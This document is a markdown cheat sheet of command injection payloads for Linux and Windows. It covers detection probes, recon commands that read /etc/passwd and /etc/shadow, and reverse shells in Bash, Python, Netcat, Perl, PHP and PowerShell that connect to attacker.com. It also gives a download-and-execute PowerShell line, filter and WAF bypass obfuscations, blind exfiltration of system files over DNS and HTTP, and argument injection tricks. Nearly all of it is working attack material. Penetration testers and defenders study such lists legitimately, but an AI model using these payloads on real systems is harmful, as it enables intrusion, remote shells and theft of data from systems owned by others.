# Command Injection Payloads

> Confirm injection exists with a time delay or DNS callback before escalating.
> Use `ping -c 1 attacker.com` or `nslookup attacker.com` as safe, low-noise probes.

---

## Detection

### Time-Based Confirmation (Safest)
```bash
# Linux
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
& sleep 5 &
|| sleep 5

# Windows
& timeout /T 5
| timeout /T 5
; timeout /T 5
& ping -n 5 127.0.0.1
```

### DNS Callback Confirmation
```bash
# Linux
; nslookup attacker.com
| nslookup attacker.com
`nslookup attacker.com`
$(nslookup attacker.com)
; curl http://attacker.com/cmdi
; wget -q http://attacker.com/cmdi

# Windows
& nslookup attacker.com
| nslookup attacker.com
& certutil -urlcache -f http://attacker.com/cmdi nul
& powershell -c "Invoke-WebRequest http://attacker.com/cmdi"
```

---

## Injection Operators

| Operator | OS | Behavior |
|---|---|---|
| `;` | Unix | Run after, regardless of exit |
| `\|` | Both | Pipe stdout to next command |
| `\|\|` | Both | Run if previous fails |
| `&&` | Both | Run if previous succeeds |
| `` ` `` | Unix | Command substitution |
| `$()` | Unix | Command substitution (preferred) |
| `&` | Both | Background execution |
| `%0a` | Both | URL-encoded newline — new command |
| `%0d%0a` | Both | CRLF — sometimes triggers new command |

---

## Basic Payloads

### Linux
```bash
; id
; whoami
; id; hostname; cat /etc/passwd
; ls -la /
| id
`id`
$(id)
|| id
&& id
; cat /etc/passwd
; cat /etc/shadow
; uname -a
; ifconfig
; ip addr
; env
; printenv
; cat /proc/self/environ
; ps aux
```

### Windows
```cmd
& whoami
& dir C:\
| whoami
&& whoami
|| whoami
& type C:\Windows\win.ini
& ipconfig /all
& net user
& net localgroup administrators
& systeminfo
& tasklist
```

---

## Reverse Shell Payloads

Always set up your listener first: `nc -lvnp 4444`

### Bash
```bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1
; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
; bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
```

### Python
```python
; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Netcat
```bash
; nc -e /bin/sh attacker.com 4444
; nc attacker.com 4444 | /bin/sh
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f
```

### Perl
```perl
; perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### PHP
```php
; php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### PowerShell (Windows)
```powershell
& powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"

& powershell -c "$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## WAF Bypass Techniques

### Whitespace Alternatives
```bash
${IFS}        ← Internal Field Separator (space substitute in bash)
$'\x20'       ← hex space
$'\x09'       ← tab
{id}          ← brace expansion
{cat,/etc/passwd}
```

### Command Obfuscation
```bash
# Variable substitution
c$@at /etc/passwd
c${a}at /etc/passwd

# Brace expansion
{ca,t} /etc/passwd

# Backtick nesting
`ec$()ho id`

# Wildcard
/bin/c?t /etc/passwd
/bin/ca* /etc/passwd
cat /etc/pass*

# Encoding via bash
echo "aWQ=" | base64 -d | bash      ← "id" base64 encoded

# printf trick
printf '%s' 'i' 'd' | bash
$(printf "\x2f\x62\x69\x6e\x2f\x69\x64")   ← /bin/id hex encoded
```

### Bypass Blocked Characters

**Semicolons blocked:**
```bash
%0a id          ← newline
| id
|| id
&& id
```

**Pipes blocked:**
```bash
; id
&& id
; id >output.txt
```

**Spaces blocked:**
```bash
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
{cat,/etc/passwd}
X=$'cat\x20/etc/passwd';$X
```

**Backticks blocked:**
```bash
$(id)
$(cat /etc/passwd)
```

**Quotes blocked:**
```bash
cat /etc/passwd       ← No quotes needed usually
cat /etc/p\asswd      ← Backslash quoting
cat /etc/passw'd'     ← Partial quotes
```

---

## Blind CMDi — Exfiltration

When you have execution but no output:

```bash
# DNS exfil — works through most firewalls
; nslookup $(id).attacker.com
; nslookup $(cat /etc/hostname).attacker.com
; curl http://attacker.com/$(id)

# HTTP exfil
; curl http://attacker.com/?data=$(cat /etc/passwd | base64 | tr -d '\n')
; wget -q -O /dev/null http://attacker.com/?data=$(id)

# Write to web root (if writable)
; id > /var/www/html/output.txt
; cat /etc/passwd > /var/www/html/out.txt

# OOB via ICMP (if no HTTP/DNS egress)
; ping -c 1 attacker.com
```

---

## Context-Specific Injections

### Inside Quotes
```bash
# Single-quoted context: target' command '
'; id; echo '

# Double-quoted context: target" command "  
"; id; echo "

# Mixed: " or '
test"; id; echo "
test'; id; echo '
```

### Argument Injection (Not Classic CMDi)
When you control an argument to a command:
```bash
# If target runs: git clone <user-controlled-url>
git clone 'https://attacker.com/--upload-pack=id'

# If target runs: ffmpeg -i <user-controlled>
-i /dev/stdin

# If target runs: curl <user-controlled>
-o /var/www/html/shell.php http://attacker.com/shell.php

# If target runs: ssh <user-controlled>@target
-oProxyCommand=id attacker
```
